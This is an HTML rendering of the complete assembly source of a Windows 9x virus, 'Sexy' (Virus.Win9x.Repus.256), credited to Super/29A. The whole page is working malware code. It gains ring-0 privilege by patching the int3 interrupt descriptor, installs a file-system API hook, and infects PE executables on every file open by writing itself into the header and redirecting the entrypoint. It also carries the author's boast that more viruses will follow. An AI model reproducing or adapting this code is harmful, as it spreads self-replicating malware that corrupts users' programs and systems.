<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.Repus.256 - SEXY.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;===================;</span><span class="sc0">
</span><span class="sc1">;    Sexy virus     ;</span><span class="sc0">
</span><span class="sc1">;===================;</span><span class="sc0">
</span><span class="sc1">; Made by Super/29A ;</span><span class="sc0">
</span><span class="sc1">;===================;</span><span class="sc0">

</span><span class="sc1">;===================================================================</span><span class="sc0">

 </span><span class="sc2">.386p</span><span class="sc0">
 </span><span class="sc5">locals</span><span class="sc0">
 </span><span class="sc5">jumps</span><span class="sc0">
 </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">

</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">LARGE</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">vxd_id</span><span class="sc4">,</span><span class="sc5">service_id</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">service_id</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">vxd_id</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">VxDJmp</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">vxd_id</span><span class="sc4">,</span><span class="sc5">service_id</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">8000h</span><span class="sc4">+</span><span class="sc5">service_id</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">vxd_id</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">IFSMgr</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0040h</span><span class="sc0">
</span><span class="sc5">GetHeap</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">000dh</span><span class="sc0">
</span><span class="sc5">InstallFileSystemAPIhook</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0067h</span><span class="sc0">
</span><span class="sc5">Ring0_FileIO</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0032h</span><span class="sc0">

</span><span class="sc1">;===================================================================</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'This is my first ring0 virus. And its not the last!'</span><span class="sc0">

</span><span class="sc1">;===================================================================</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;   int 3</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0"> </span><span class="sc1">;save all regs</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">

</span><span class="sc5">setup_ring0</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc7">fstp</span><span class="sc0"> </span><span class="sc10">real8</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;restore int3 descriptor form copro stack</span><span class="sc0">
                </span><span class="sc1">; (and leave copro stack as before)</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; this byte should be zero (=reserved)</span><span class="sc0">
   </span><span class="sc6">scasb</span><span class="sc0">     </span><span class="sc1">; we change it to mark residency</span><span class="sc0">

   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">back_to_ring3</span><span class="sc0"> </span><span class="sc1">;it's already resident</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">420h</span><span class="sc0"> </span><span class="sc1">;number of bytes to reserve from heap</span><span class="sc0">

   </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">real8</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;save instruction in copro stack</span><span class="sc0">
</span><span class="sc5">fix1</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr</span><span class="sc4">,</span><span class="sc5">GetHeap</span><span class="sc0"> </span><span class="sc1">;allocate memory</span><span class="sc0">

   </span><span class="sc7">fst</span><span class="sc0"> </span><span class="sc10">real8</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;restore instruction from copro stack</span><span class="sc0">
               </span><span class="sc1">;value is *not* extracted from copro stack yet</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;ecx=420h</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">;esi=host base address</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0"> </span><span class="sc1">;ecx=400h</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;edi=offset of reserved memory</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;copy virus to memory</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-(</span><span class="sc5">end_code</span><span class="sc4">-</span><span class="sc5">API_hook</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr</span><span class="sc4">,</span><span class="sc5">InstallFileSystemAPIhook</span><span class="sc0"> </span><span class="sc1">;install api hook</span><span class="sc0">

   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;esi contains the address of previous hook handler</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0"> </span><span class="sc1">;save previous_hook</span><span class="sc0">

</span><span class="sc5">search_api_chain</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">lodsd</span><span class="sc0"> </span><span class="sc1">;get offset of previous hook info structure</span><span class="sc0">
     </span><span class="sc1">; this structure looks like this:</span><span class="sc0">
     </span><span class="sc1">;   +0=previous hook info structure (from down to top)</span><span class="sc0">
     </span><span class="sc1">;   +4=address of hook handler</span><span class="sc0">
     </span><span class="sc1">;   +8=next hook info structure (from top to down, that is, to the</span><span class="sc0">
     </span><span class="sc1">;  (one that was installed before)</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;esi=next hook info structure</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;esi=third dword in structure</span><span class="sc0">
   </span><span class="sc6">js</span><span class="sc0"> </span><span class="sc5">search_api_chain</span><span class="sc0">

</span><span class="sc1">;eax=Should point after the hook info struc of default handler.</span><span class="sc0">
</span><span class="sc1">;    After this structure is a variable that contains the address</span><span class="sc0">
</span><span class="sc1">;    of the top hook info structure</span><span class="sc0">

   </span><span class="sc6">stosd</span><span class="sc0"> </span><span class="sc1">;save offset that holds top chain</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0"> </span><span class="sc1">;save start of buffer in memory</span><span class="sc0">

   </span><span class="sc7">fstp</span><span class="sc0"> </span><span class="sc10">real8</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">8032h</span><span class="sc0"> </span><span class="sc1">; create dinamic call</span><span class="sc0">
                  </span><span class="sc1">; to call ifsmgr_ring0_fileio</span><span class="sc0">

</span><span class="sc5">back_to_ring3</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">iret</span><span class="sc0"> </span><span class="sc1">;bye bye, ring0</span><span class="sc0">


</span><span class="sc5">get_delta</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0"> </span><span class="sc1">;copy in stack the address of previous handler so as to return later</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc2">24h</span><span class="sc0"> </span><span class="sc1">; is this a file open?</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0"> </span><span class="sc1">;nope, exit</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get ioreq structure</span><span class="sc0">

   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;edi=holds top chain address</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;make top chain null, there will be no file monitor active</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;edi=start of buffer to read/write file</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">;ebp="vxdjmp ifsmgr_ring0_fileio"</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;esi=filename in unicode format</span><span class="sc0">

</span><span class="sc5">convert</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;convert it to asciiz format</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">cmpsb</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">convert</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0d5h</span><span class="sc0"> </span><span class="sc1">;r0_opencreatefile</span><span class="sc0">
   </span><span class="sc6">cdq</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;if file exists, then open the file</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;read/write access</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc1">;open file</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">exit2</span><span class="sc0">

   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">0d6h</span><span class="sc0"> </span><span class="sc1">;r0_readfile</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cdq</span><span class="sc0"> </span><span class="sc1">;edx=0=filepointer</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;ecx=300h bytes to read</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc1">;read from file</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;have we read 300h bytes?</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">test2</span><span class="sc0"> </span><span class="sc1">;nope, exit</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0"> </span><span class="sc1">;PE header before 200h?</span><span class="sc0">
   </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">test1</span><span class="sc0"> </span><span class="sc1">;nope, exit</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">55h</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0"> </span><span class="sc1">;file header size less than 400h</span><span class="sc0">
   </span><span class="sc6">jna</span><span class="sc0"> </span><span class="sc5">test1</span><span class="sc0"> </span><span class="sc1">;yep, exit</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">test2</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;set new entrypoint</span><span class="sc0">
</span><span class="sc5">test1</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,(</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">fix2</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;ecx=host entrypoint - 300h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-(</span><span class="sc5">r0fio</span><span class="sc4">-</span><span class="sc5">fix2</span><span class="sc4">)],</span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">test2</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'P'</span><span class="sc0">
</span><span class="sc5">test2</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">closefile</span><span class="sc0"> </span><span class="sc1">;error, exit</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;(ecx=400h)</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;r0_writefile</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc1">;write header+virus = 400h bytes</span><span class="sc0">

</span><span class="sc5">closefile</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0d7h</span><span class="sc0"> </span><span class="sc1">;r0_closefile</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">exit2</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0"> </span><span class="sc1">;restore top api chain</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc5">_ret</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc1">;jump to previous hook</span><span class="sc0">


</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;eax=start of ring0 code</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
   </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">jump_host</span><span class="sc0"> </span><span class="sc1">;jump if winNT</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+(</span><span class="sc5">fix1</span><span class="sc4">-</span><span class="sc5">setup_ring0</span><span class="sc4">)]</span><span class="sc0"> </span><span class="sc1">;esi=instruction to patch</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">sidt</span><span class="sc0"> </span><span class="sc10">fword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">;edi=start of IDT</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">3h</span><span class="sc0"> </span><span class="sc1">;edi=int3 descriptor</span><span class="sc0">

   </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">real8</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;save in coprocessor stack this descriptor</span><span class="sc0">

   </span><span class="sc6">stosw</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc6">scasw</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eeh</span><span class="sc0">   </span><span class="sc1">; create an intgate descriptor</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3h</span><span class="sc0">   </span><span class="sc1">;jump to ring-0 !</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc5">jump_host</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0"> </span><span class="sc1">;restore all regs</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0"> </span><span class="sc1">;jump to host entrypoint</span><span class="sc0">
</span><span class="sc5">fix2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">_ret</span><span class="sc4">-</span><span class="sc5">fix2</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[A92\repuS yb yxeS]'</span><span class="sc0">



</span><span class="sc5">API_hook</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;reserve space in stack to copy the address to next handler</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_delta</span><span class="sc0">

</span><span class="sc5">end_code</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">vir_length</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">old_API</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">api_chain</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">buffer_start</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">r0fio</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc5">VxDJmp</span><span class="sc0"> </span><span class="sc5">IFSMgr</span><span class="sc4">,</span><span class="sc5">Ring0_FileIO</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
